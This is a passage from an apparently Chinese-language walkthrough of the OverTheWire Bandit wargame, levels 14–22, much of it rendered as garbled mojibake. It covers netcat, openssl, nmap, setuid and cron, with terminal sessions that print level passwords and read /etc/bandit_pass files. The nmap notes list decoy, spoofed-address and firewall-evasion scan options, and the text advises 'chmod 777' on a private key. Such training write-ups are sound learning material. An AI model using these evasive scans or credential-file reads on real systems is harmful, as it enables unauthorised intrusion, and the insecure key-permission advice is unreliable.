DESCRIPTION The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6. Unlike telnet(1), nc scripts nicely, and separates error messages onto standard error instead of sending them to standard output, as telnet(1) does with some. Most used options -g&lt;ç½‘å…³&gt;ï¼šè®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šè®¾ç½®8ä¸ª; -G&lt;æŒ‡å‘å™¨æ•°ç›®&gt;ï¼šè®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°; -hï¼šåœ¨çº¿å¸®åŠ©; -i&lt;å»¶è¿Ÿç§’æ•°&gt;ï¼šè®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£; -lï¼šä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç›‘æ§ä¼ å…¥çš„èµ„æ–™; -nï¼šç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨; -o&lt;è¾“å‡ºæ–‡ä»¶&gt;ï¼šæŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜; -p&lt;é€šä¿¡ç«¯å£&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£; -rï¼šæŒ‡å®šæºç«¯å£å’Œç›®çš„ç«¯å£éƒ½è¿›è¡Œéšæœºçš„é€‰æ‹©; -s&lt;æ¥æºä½å€&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€; -uï¼šä½¿ç”¨UDPä¼ è¾“åè®®; -vï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹; -w&lt;è¶…æ—¶ç§’æ•°&gt;ï¼šè®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´; -zï¼šä½¿ç”¨0è¾“å…¥/è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨ã€‚ 1234bandit14@bandit:~$ nc localhost 300004wcYUJFw0k0XLShlDzztnTBHiqxU3b3eCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNr Level_15â¡Level_16Learn about opensslã€s_client The s_client command implements a generic SSL/TLS client which connects to a remote host using SSL/TLS. It is a very useful diagnostic tool for SSL servers. manæ–‡æ¡£å†™çš„å¾ˆè¯¦ç»†ã€‚ ç›´æ¥è¿å°±è¡Œ openssl s_client -connect localhost:30001 è¾“å…¥æœ¬å…³flagå³å¯ Level_16â¡Level_17Whatâ€™s nmap?Name nmap - Network exploration tool and security / port scanner Synopsis nmap [Scan Typeâ€¦] [Options] {target specification} Options -sT TCP connect()æ‰«æï¼Œè¿™ç§æ–¹å¼ä¼šåœ¨ç›®æ ‡ä¸»æœºçš„æ—¥å¿—ä¸­è®°å½•å¤§æ‰¹è¿æ¥è¯·æ±‚å’Œé”™è¯¯ä¿¡æ¯ã€‚ -sS åŠå¼€æ‰«æï¼Œå¾ˆå°‘æœ‰ç³»ç»Ÿèƒ½æŠŠå®ƒè®°å…¥ç³»ç»Ÿæ—¥å¿—ã€‚ä¸è¿‡ï¼Œéœ€è¦Rootæƒé™ã€‚ -sF -sN ç§˜å¯†FINæ•°æ®åŒ…æ‰«æã€Xmas Treeã€Nullæ‰«ææ¨¡å¼ -sP pingæ‰«æï¼ŒNmapåœ¨æ‰«æç«¯å£æ—¶ï¼Œé»˜è®¤éƒ½ä¼šä½¿ç”¨pingæ‰«æï¼Œåªæœ‰ä¸»æœºå­˜æ´»ï¼ŒNmapæ‰ä¼šç»§ç»­æ‰«æã€‚ -sU UDPæ‰«æï¼Œä½†UDPæ‰«ææ˜¯ä¸å¯é çš„ -sA è¿™é¡¹é«˜çº§çš„æ‰«ææ–¹æ³•é€šå¸¸ç”¨æ¥ç©¿è¿‡é˜²ç«å¢™çš„è§„åˆ™é›† -sV æ¢æµ‹ç«¯å£æœåŠ¡ç‰ˆæœ¬ -Pn æ‰«æä¹‹å‰ä¸éœ€è¦ç”¨pingå‘½ä»¤ï¼Œæœ‰äº›é˜²ç«å¢™ç¦æ­¢pingå‘½ä»¤ã€‚å¯ä»¥ä½¿ç”¨æ­¤é€‰é¡¹è¿›è¡Œæ‰«æ -v æ˜¾ç¤ºæ‰«æè¿‡ç¨‹ï¼Œæ¨èä½¿ç”¨ -h å¸®åŠ©é€‰é¡¹ï¼Œæ˜¯æœ€æ¸…æ¥šçš„å¸®åŠ©æ–‡æ¡£ -p æŒ‡å®šç«¯å£ï¼Œå¦‚â€œ1-65535ã€1433ã€135ã€22ã€80â€ç­‰ -O å¯ç”¨è¿œç¨‹æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼Œå­˜åœ¨è¯¯æŠ¥ -A å…¨é¢ç³»ç»Ÿæ£€æµ‹ã€å¯ç”¨è„šæœ¬æ£€æµ‹ã€æ‰«æç­‰ -oN/-oX/-oG å°†æŠ¥å‘Šå†™å…¥æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯æ­£å¸¸ã€XMLã€grepable ä¸‰ç§æ ¼å¼ -T4 é’ˆå¯¹TCPç«¯å£ç¦æ­¢åŠ¨æ€æ‰«æå»¶è¿Ÿè¶…è¿‡10ms -iL è¯»å–ä¸»æœºåˆ—è¡¨ï¼Œä¾‹å¦‚ï¼Œâ€œ-iL C:\\ip.txtâ€ 123456789101112131415161718192021222324252627282930nmapå¸¸ç”¨å‚æ•° nmap -A IP æœ€å¸¸è§„çš„nmapæ‰«ænmap -sP IP ç®€å•æ‰«æï¼ˆsimple Pingï¼‰nmap -sS IP ç”¨SYNè¿›è¡Œæ‰«æï¼Œä¼šå‘ç›®æ ‡å‘ä¸€ä¸ªå°çš„åŒ…nmap -sT IP ç”¨TCPè¿›è¡Œæ‰«æï¼Œä¼šå‘ç›®æ ‡å‘ä¸€ä¸ªå°çš„åŒ…nmap -sU IP ç”¨UDPè¿›è¡Œæ‰«æï¼Œä¼šå‘ç›®æ ‡å‘ä¸€ä¸ªå°çš„åŒ…nmap -sI IP1 IP2 ç”¨ä¼ªè£…çš„IP1åœ°å€å»æ‰«æç›®æ ‡IP2 nmap IP ; nmap -PE IP å¸¸è§„çš„åŸºäºICMP pingæ‰«ænmap -PP IP ä½¿ç”¨ICMPæ—¶é—´æˆ³æ‰«æï¼Œå¯ä»¥é€å¢™nmap -PN IP IPå¦‚çœ‹ä¼¼ç¦»çº¿ã€å®•æœºï¼Œå°è¯•æ­¤å‚æ•°ï¼Œä¸ç”¨ICMP PINGæ¥è¿›è¡Œæ‰«ænmap -PS IP ä½¿ç”¨TCP SYN æ‰«æï¼Œä¸ç”¨ICMPnmap -PA IP ä½¿ç”¨TCP ACK æ‰«æï¼Œä¸ç”¨ICMPnmap -PU IP ä½¿ç”¨UDP æ‰«æï¼Œä¸ç”¨ICMPnmap -p ç«¯å£å· IP æ‰«ææŸIPçš„æŸç«¯å£nmap -O IP æ‰«æç›®çš„IPè®¾å¤‡ï¼Œç³»ç»Ÿæ£€æµ‹æŸ¥çœ‹OSç­‰ä¿¡æ¯ nmap -sU -sT -p U:53,T:25 172.20.6.69 æ‰«æ172.20.6.69 çš„tcp25å£ï¼Œudpçš„53å£nmap â€“source-port 54 172.20.6.69 ç”¨æŒ‡å®šçš„ç«¯å£ï¼ˆå¦‚54ï¼‰å»æ‰«æç›®æ ‡IPï¼ˆ172.20.6.69ï¼‰nmap â€“data-length 25 172.20.6.69 å‘æŒ‡å®šé•¿åº¦çš„åŒ…å»æ¢æµ‹ç›®æ ‡IPnmap â€“randomize-hosts 172.20.6.69-100 éšæœºéå†æ‰«æ172.20.6.69-100ä¹‹é—´çš„IP nmap -D RND:10 172.20.6.69 â€”D è¯±é¥µé€‰é¡¹ï¼Œè®¾å®šnä¸ªéšæœºè™šå‡çš„åœ°å€å»æ‰«æç›®æ ‡åœ°å€172.20.6.69nmap -d 172.20.6.69 debugæ¨¡å¼æ‰«æç›®æ ‡IP,å¯ä»¥çœ‹åˆ°æ¯ä¸€æ­¥çš„è¿›åº¦nmap â€“mtu 8 172.20.6.69 è®¾ç½®mtuä¸º8 ï¼Œå‘å¾ˆå°çš„åŒ…ç»™172.20.6.69è¿›è¡Œæ‰«æï¼Œèƒ½é¿å…å¤§å¤šæ•°çš„é˜²ç«å¢™çš„é˜»æ‹¦ï¼Œæ­¤å€¼åªè¦æ˜¯8çš„å€æ•°å°±è¡Œï¼Œå¦‚16ï¼Œ32,40.ã€‚ã€‚ã€‚nmap -F IP å¿«é€Ÿæ‰«æç›®æ ‡IPç«¯å£ï¼Œä¹Ÿå‘é€å¾ˆå°çš„åŒ…ç»™ç›®æ ‡åœ°å€ï¼Œæœ‰ç‚¹ç±»ä¼¼ä¸Šæ¡ â€“mtu 8 nmap -oN scan.txt 172.20.6.1/24 æ‰«æ172.20.6.0ç½‘æ®µè®¾å¤‡ï¼Œç»“æœè¾“å‡ºè‡³æ–‡ä»¶sanc.txtä¸­nmap -oX scan.xml 172.20.6.1/24 æ‰«æ172.20.6.0ç½‘æ®µè®¾å¤‡ï¼Œç»“æœè¾“å‡ºè‡³æ–‡ä»¶sanc.xmlä¸­ 1nmap -sV localhost -p 31000-32000 æ‰«å‡ºæ¥çš„å‡ ä¸ªç«¯å£ä¸å¤šä¸€ä¸ªä¸ªè¯•å³å¯ 1bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof è¾“å…¥æœ¬å…³å¯†ç å³å¯å¾—åˆ°ä¸‹ä¸€å…³çš„å¯†é’¥ Level_17â¡Level_18ç”¨ä¸Šä¸€å…³private_keyè¿›è¡Œè¿æ¥çš„æ—¶å€™æ³¨æ„ä¸€ç‚¹ï¼Œè¦ç”¨chmodæ”¹ä¸€ä¸‹ç§é’¥æƒé™ 1chmod 777 rsa.priv Usage of diff1234567bandit17@bandit:~$ lspasswords.new passwords.oldbandit17@bandit:~$ diff passwords.old passwords.new42c42&lt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii---&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Level_18â¡Level_19è¿æ¥åˆ°sshåæ²¡æœ‰ä¼ªç»ˆç«¯ç•Œé¢ï¼Œä½†æ˜¯æˆ‘ä»¬ä¾æ—§å¯ä»¥æ‰§è¡Œå‘½ä»¤ 12345678910111213141516ubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org ls -alThis is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org&#x27;s password: total 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r----- 1 bandit19 bandit18 3549 May 7 2020 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profile-rw-r----- 1 bandit19 bandit18 33 May 7 2020 readmeubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org cat readmeThis is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org&#x27;s password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x OR us Options: -T:ç¦æ­¢åˆ†é…ä¼ªç»ˆç«¯ è™½ç„¶æ²¡æœ‰ä¼ªç»ˆç«¯ï¼Œä½†è¿™æ—¶æˆ‘ä»¬ä¾æ—§å¯ä»¥ä½¿ç”¨shell Level_19â¡Level_20Learn about chmod and setuid:chmod:(change modeï¼‰æ§åˆ¶ç”¨æˆ·å¯¹æ–‡ä»¶çš„æƒé™çš„å‘½ä»¤ Linux/Unix çš„æ–‡ä»¶è°ƒç”¨æƒé™åˆ†ä¸ºä¸‰çº§ : æ–‡ä»¶æ‰€æœ‰è€…ï¼ˆOwnerï¼‰ã€ç”¨æˆ·ç»„ï¼ˆGroupï¼‰ã€å…¶å®ƒç”¨æˆ·ï¼ˆOther Usersï¼‰ã€‚ åªæœ‰æ–‡ä»¶æ‰€æœ‰è€…å’Œè¶…çº§ç”¨æˆ·å¯ä»¥ä¿®æ”¹æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™ã€‚å¯ä»¥ä½¿ç”¨ç»å¯¹æ¨¡å¼ï¼ˆå…«è¿›åˆ¶æ•°å­—æ¨¡å¼ï¼‰ï¼Œç¬¦å·æ¨¡å¼æŒ‡å®šæ–‡ä»¶çš„æƒé™ã€‚ 1chmod [-cfvR] [--help] [--version] mode file... Options: 1[ugoa...][[+-&#x3D;][rwxX]...][,...] u è¡¨ç¤ºè¯¥æ–‡ä»¶çš„æ‹¥æœ‰è€…ï¼Œg è¡¨ç¤ºä¸è¯¥æ–‡ä»¶çš„æ‹¥æœ‰è€…å±äºåŒä¸€ä¸ªç¾¤ä½“(group)è€…ï¼Œo è¡¨ç¤ºå…¶ä»–ä»¥å¤–çš„äººï¼Œa è¡¨ç¤ºè¿™ä¸‰è€…çš†æ˜¯ã€‚ + è¡¨ç¤ºå¢åŠ æƒé™ã€- è¡¨ç¤ºå–æ¶ˆæƒé™ã€= è¡¨ç¤ºå”¯ä¸€è®¾å®šæƒé™ã€‚ r è¡¨ç¤ºå¯è¯»å–ï¼Œw è¡¨ç¤ºå¯å†™å…¥ï¼Œx è¡¨ç¤ºå¯æ‰§è¡Œï¼ŒX è¡¨ç¤ºåªæœ‰å½“è¯¥æ–‡ä»¶æ˜¯ä¸ªå­ç›®å½•æˆ–è€…è¯¥æ–‡ä»¶å·²ç»è¢«è®¾å®šè¿‡ä¸ºå¯æ‰§è¡Œã€‚ ç¬¦å·æ¨¡å¼ ä½¿ç”¨ç¬¦å·æ¨¡å¼å¯ä»¥è®¾ç½®å¤šä¸ªé¡¹ç›®ï¼šwhoï¼ˆç”¨æˆ·ç±»å‹ï¼‰ï¼Œoperatorï¼ˆæ“ä½œç¬¦ï¼‰å’Œ permissionï¼ˆæƒé™ï¼‰ï¼Œæ¯ä¸ªé¡¹ç›®çš„è®¾ç½®å¯ä»¥ç”¨é€—å·éš”å¼€ã€‚ å‘½ä»¤ chmod å°†ä¿®æ”¹ who æŒ‡å®šçš„ç”¨æˆ·ç±»å‹å¯¹æ–‡ä»¶çš„è®¿é—®æƒé™ï¼Œç”¨æˆ·ç±»å‹ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªå­—æ¯åœ¨ who çš„ä½ç½®æ¥è¯´æ˜ï¼Œå¦‚ who çš„ç¬¦å·æ¨¡å¼è¡¨æ‰€ç¤º: | who | ç”¨æˆ·ç±»å‹ | è¯´æ˜ || â€”â€” | â€”â€”â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” || u | user | æ–‡ä»¶æ‰€æœ‰è€… || g | group | æ–‡ä»¶æ‰€æœ‰è€…æ‰€åœ¨ç»„ || o | others | æ‰€æœ‰å…¶ä»–ç”¨æˆ· || a | all | æ‰€ç”¨ç”¨æˆ·, ç›¸å½“äº ugo | operator çš„ç¬¦å·æ¨¡å¼è¡¨: Operator è¯´æ˜ + ä¸ºæŒ‡å®šçš„ç”¨æˆ·ç±»å‹å¢åŠ æƒé™ - å»é™¤æŒ‡å®šç”¨æˆ·ç±»å‹çš„æƒé™ = è®¾ç½®æŒ‡å®šç”¨æˆ·æƒé™çš„è®¾ç½®ï¼Œå³å°†ç”¨æˆ·ç±»å‹çš„æ‰€æœ‰æƒé™é‡æ–°è®¾ç½® permission çš„ç¬¦å·æ¨¡å¼è¡¨: æ¨¡å¼ åå­— è¯´æ˜ r è¯» è®¾ç½®ä¸ºå¯è¯»æƒé™ w å†™ è®¾ç½®ä¸ºå¯å†™æƒé™ x æ‰§è¡Œæƒé™ è®¾ç½®ä¸ºå¯æ‰§è¡Œæƒé™ X ç‰¹æ®Šæ‰§è¡Œæƒé™ åªæœ‰å½“æ–‡ä»¶ä¸ºç›®å½•æ–‡ä»¶ï¼Œæˆ–è€…å…¶ä»–ç±»å‹çš„ç”¨æˆ·æœ‰å¯æ‰§è¡Œæƒé™æ—¶ï¼Œæ‰å°†æ–‡ä»¶æƒé™è®¾ç½®å¯æ‰§è¡Œ s setuid/gid å½“æ–‡ä»¶è¢«æ‰§è¡Œæ—¶ï¼Œæ ¹æ®whoå‚æ•°æŒ‡å®šçš„ç”¨æˆ·ç±»å‹è®¾ç½®æ–‡ä»¶çš„setuidæˆ–è€…setgidæƒé™ t ç²˜è´´ä½ è®¾ç½®ç²˜è´´ä½ï¼Œåªæœ‰è¶…çº§ç”¨æˆ·å¯ä»¥è®¾ç½®è¯¥ä½ï¼Œåªæœ‰æ–‡ä»¶æ‰€æœ‰è€…uå¯ä»¥ä½¿ç”¨è¯¥ä½ å…«è¿›åˆ¶è¯­æ³•chmodå‘½ä»¤å¯ä»¥ä½¿ç”¨å…«è¿›åˆ¶æ•°æ¥æŒ‡å®šæƒé™ã€‚æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™ä½æ˜¯ç”±9ä¸ªæƒé™ä½æ¥æ§åˆ¶ï¼Œæ¯ä¸‰ä½ä¸ºä¸€ç»„ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯æ–‡ä»¶æ‰€æœ‰è€…ï¼ˆUserï¼‰çš„è¯»ã€å†™ã€æ‰§è¡Œï¼Œç”¨æˆ·ç»„ï¼ˆGroupï¼‰çš„è¯»ã€å†™ã€æ‰§è¡Œä»¥åŠå…¶å®ƒç”¨æˆ·ï¼ˆOtherï¼‰çš„è¯»ã€å†™ã€æ‰§è¡Œã€‚å†å²ä¸Šï¼Œæ–‡ä»¶æƒé™è¢«æ”¾åœ¨ä¸€ä¸ªæ¯”ç‰¹æ©ç ä¸­ï¼Œæ©ç ä¸­æŒ‡å®šçš„æ¯”ç‰¹ä½è®¾ä¸º1ï¼Œç”¨æ¥è¯´æ˜ä¸€ä¸ªç±»å…·æœ‰ç›¸åº”çš„ä¼˜å…ˆçº§ã€‚ # æƒé™ rwx äºŒè¿›åˆ¶ 7 è¯» + å†™ + æ‰§è¡Œ rwx 111 6 è¯» + å†™ rw- 110 5 è¯» + æ‰§è¡Œ r-x 101 4 åªè¯» râ€” 100 3 å†™ + æ‰§è¡Œ -wx 011 2 åªå†™ -w- 010 1 åªæ‰§è¡Œ â€”x 001 0 æ—  â€”- 000 Demo: chmod 765 æ‰€æœ‰è€…çš„æƒé™ç”¨æ•°å­—è¡¨è¾¾ï¼šå±ä¸»çš„é‚£ä¸‰ä¸ªæƒé™ä½çš„æ•°å­—åŠ èµ·æ¥çš„æ€»å’Œã€‚å¦‚ rwx ï¼Œä¹Ÿå°±æ˜¯ 4+2+1 ï¼Œåº”è¯¥æ˜¯ 7ã€‚ ç”¨æˆ·ç»„çš„æƒé™ç”¨æ•°å­—è¡¨è¾¾ï¼šå±ç»„çš„é‚£ä¸ªæƒé™ä½æ•°å­—çš„ç›¸åŠ çš„æ€»å’Œã€‚å¦‚ rw- ï¼Œä¹Ÿå°±æ˜¯ 4+2+0 ï¼Œåº”è¯¥æ˜¯ 6ã€‚ å…¶å®ƒç”¨æˆ·çš„æƒé™æ•°å­—è¡¨è¾¾ï¼šå…¶å®ƒç”¨æˆ·æƒé™ä½çš„æ•°å­—ç›¸åŠ çš„æ€»å’Œã€‚å¦‚ r-x ï¼Œä¹Ÿå°±æ˜¯ 4+0+1 ï¼Œåº”è¯¥æ˜¯ 5ã€‚ Demo: å°†æ–‡ä»¶ file1.txt è®¾ä¸ºæ‰€æœ‰äººçš†å¯è¯»å– : 1chmod ugo+r file1.txt å°†æ–‡ä»¶ file1.txt è®¾ä¸ºæ‰€æœ‰äººçš†å¯è¯»å– : 1chmod a+r file1.txt å°†æ–‡ä»¶ file1.txt ä¸ file2.txt è®¾ä¸ºè¯¥æ–‡ä»¶æ‹¥æœ‰è€…ï¼Œä¸å…¶æ‰€å±åŒä¸€ä¸ªç¾¤ä½“è€…å¯å†™å…¥ï¼Œä½†å…¶ä»–ä»¥å¤–çš„äººåˆ™ä¸å¯å†™å…¥ : 1chmod ug+w,o-w file1.txt file2.txt ä¸º ex1.py æ–‡ä»¶æ‹¥æœ‰è€…å¢åŠ å¯æ‰§è¡Œæƒé™: 1chmod u+x ex1.py å°†ç›®å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸å­ç›®å½•çš†è®¾ä¸ºä»»ä½•äººå¯è¯»å– : 1chmod -R a+r * setuid: SUID ç‰¹æ®Šæƒé™ä»…é€‚ç”¨äºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€å…·æœ‰çš„åŠŸèƒ½æ˜¯ï¼Œåªè¦ç”¨æˆ·å¯¹è®¾æœ‰ SUID çš„æ–‡ä»¶æœ‰æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆå½“ç”¨æˆ·æ‰§è¡Œæ­¤æ–‡ä»¶æ—¶ï¼Œä¼šä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„èº«ä»½å»æ‰§è¡Œæ­¤æ–‡ä»¶ï¼Œä¸€æ—¦æ–‡ä»¶æ‰§è¡Œç»“æŸï¼Œèº«ä»½çš„åˆ‡æ¢ä¹Ÿéšä¹‹æ¶ˆå¤±ã€‚ æ‰€ä»¥æˆ‘ä»¬ä»¥bandit20èº«ä»½cat flagå³å¯ 123456789bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do idbandit19@bandit:~$ ./bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)bandit19@bandit:~$ cat /etc/bandit_pass/bandit20cat: /etc/bandit_pass/bandit20: Permission deniedbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level_20â¡Level_21å…¶å®å°±æ˜¯å¼€å¯å¤šä¸ªshellçª—å£ç”¨ncåœ¨åŒä¸€ä¸ªç«¯å£ä¸‹é€šä¿¡: Terminal 1 (host): 1234bandit20@melinda:~$ nc -nvlp 44444Listening on [0.0.0.0] (family 0, port 44444)GbKksEFF4yrVs6il55v6gwY5aVje5f0jgE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr &#x2F;&#x2F;get flag Terminal 2 (client): 12bandit20@melinda:~$ .&#x2F;suconnect 44444Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level_21â¡Level_22Learn about crontab:crontabæ˜¯ä¸€ä¸ªå¯ä»¥æ ¹æ®æ—¶é—´ã€æ—¥æœŸã€æœˆä»½ã€æ˜ŸæœŸçš„ç»„åˆè°ƒåº¦å¯¹é‡å¤ä»»åŠ¡çš„æ‰§è¡Œçš„å®ˆæŠ¤è¿›ç¨‹ã€‚ crontabæ–‡ä»¶ä¸­ï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªä»»åŠ¡ï¼›æ¯è¡Œæœ‰å…­åˆ—ï¼Œæ¯åˆ—ä»£è¡¨ä¸€é¡¹è®¾ç½®ï¼Œå‰äº”åˆ—ä¸ºæ—¶é—´é¢‘ç‡è®¾å®šï¼Œç¬¬å…­åˆ—æ˜¯è¦æ‰§è¡Œçš„ä»»åŠ¡ã€‚ 1minute hour day mouth week command #åˆ† æ—¶ æ—¥ æœˆ å‘¨ å‘½ä»¤ minuteè¡¨ç¤ºåˆ†é’Ÿï¼Œå¯ä»¥æ˜¯0~59çš„ä»»æ„æ•´æ•°ã€‚ hourè¡¨ç¤ºå°æ—¶ï¼Œå¯ä»¥æ˜¯2~23çš„ä»»æ„æ•´æ•° dayè¡¨ç¤ºæ—¥æœŸï¼Œå¯ä»¥æ˜¯1~31çš„ä»»æ„æ•´æ•° monthè¡¨ç¤ºæœˆä»½ï¼Œå¯ä»¥æ˜¯1~12çš„ä»»æ„æ•´æ•° weekè¡¨ç¤ºæ˜ŸæœŸå‡ ï¼Œå¯ä»¥æ˜¯0~7ä¹‹é—´çš„æ•´æ•°ï¼Œ0æˆ–è€…7è¡¨ç¤ºæ˜ŸæœŸå¤© commandè¡¨ç¤ºæ‰§è¡Œçš„å‘½ä»¤ ä¸Šé¢çš„è®¾ç½®é™¤äº†æ•°å­—ä¹‹å¤–è¿˜å¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ï¼š æ˜Ÿå·*ï¼šè¡¨ç¤ºæ‰€æœ‰å¯èƒ½çš„å€¼ï¼Œå¯ä»¥ç†è§£æ¯éš”ã€‚ é€—å·,ï¼šç”¨é€—å·éš”å¼€çš„å€¼è¡¨ç¤ºä¸€ä¸ªåˆ—è¡¨èŒƒå›´ï¼Œå¦‚1,2,3 æ¯å¤©æ¯å°æ—¶çš„ç¬¬ä¸€ã€ç¬¬äºŒã€ç¬¬ä¸‰åˆ†é’Ÿã€‚ ä¸­æ -ï¼šç”¨ä¸­æ éš”å¼€çš„å€¼è¡¨ç¤ºä¸€ä¸ªæ•°å€¼èŒƒå›´ï¼Œå¦‚1-10 æ¯å¤©æ¯å°æ—¶çš„1åˆ°10åˆ†é’Ÿã€‚ æ­£æ–œçº¿/ï¼šæŒ‡å®šæ‰§è¡Œä»»åŠ¡çš„é—´éš”é¢‘ç‡ï¼Œå¦‚ 0 10-18/2 *æ¯å¤©çš„åç‚¹åˆ°åå…«ç‚¹é—´éš”2å°æ—¶æ‰§è¡Œã€‚ Demo: 12345678910111213141516171819202122232425262728# æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡* * * * * # æ¯å°æ—¶çš„ç¬¬3å’Œç¬¬15åˆ†é’Ÿæ‰§è¡Œ3,15 * * * *#åœ¨ä¸Šåˆçš„8ç‚¹åˆ°11ç‚¹çš„ç¬¬3å’Œç¬¬15åˆ†é’Ÿæ‰§è¡Œ3,15 8-11 * * *#åœ¨æ¯éš”2å¤©çš„ä¸Šåˆ8ç‚¹å’Œ11ç‚¹çš„ç¬¬3å’Œç¬¬15åˆ†é’Ÿæ‰§è¡Œ3,15 8-11 */2 * *#æ¯ä¸ªæ˜ŸæœŸä¸€çš„ä¸Šåˆ8ç‚¹åˆ°11ç‚¹çš„ç¬¬3å’Œç¬¬15åˆ†é’Ÿæ‰§è¡Œ3,15 8-11 * * 1#æ¯æ™šçš„21ï¼š30æ‰§è¡Œ30 21 * * *#æ¯æœˆ1ã€10ã€22æ—¥çš„4:30æ‰§è¡Œ30 4 1,10,22 * *#æ¯å‘¨å…­ã€æ—¥1:10æ‰§è¡Œ10 1 * * 6,7#æ¯å¤©18:00åˆ°23:00ä¹‹é—´æ¯éš”30åˆ†é’Ÿæ‰§è¡Œ0/30 18-23 * * *#æ˜ŸæœŸå…­çš„23:00æ‰§è¡Œ0 23 * * 6#æ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡* */1 * * *#æ™šä¸Š11ç‚¹åˆ°æ—©ä¸Š7ç‚¹ä¹‹é—´ï¼Œæ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡* 23-7/1 * * *#æ¯æœˆçš„4å·ä¸æ¯å‘¨ä¸€åˆ°å‘¨ä¸‰çš„11ç‚¹0 11 4 * 1-3#ä¸€æœˆä¸€å·çš„4ç‚¹0 4 1 1 * Cron also offers some special strings, which can be used in place of the five time-and-date fields: | string | meaning || â€”â€”â€”â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” || @reboot | Run once, at startup. || @yearly | Run once a year, â€œ0 0 1 1 â€œ. || @annually | (same as @yearly) || @monthly | Run once a month, â€œ0 0 1 â€œ. || @weekly | Run once a week, â€œ0 0 0â€. || @daily | Run once a day, â€œ0 0 â€œ. || @midnight | (same as @daily) || @hourly | Run once an hour, â€œ0 â€œ. | 1234567891011121314151617181920bandit21@bandit:~$ cd /etc/cron.dbandit21@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootbandit21@bandit:/etc/cron.d$ cat cronjob_bandit_bandit22cat: cronjob_bandit_bandit22: No such file or directorybandit21@bandit:/etc/cron.d$ cat cronjob_bandit_22cat: cronjob_bandit_22: No such file or directorybandit21@bandit:/etc/cron.d$ cat cronjob_bandit22@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLI Level_22â¡Level_23Learn about md5sum and command cut:MD5ç®—æ³•å¸¸å¸¸è¢«ç”¨æ¥éªŒè¯ç½‘ç»œæ–‡ä»¶ä¼ 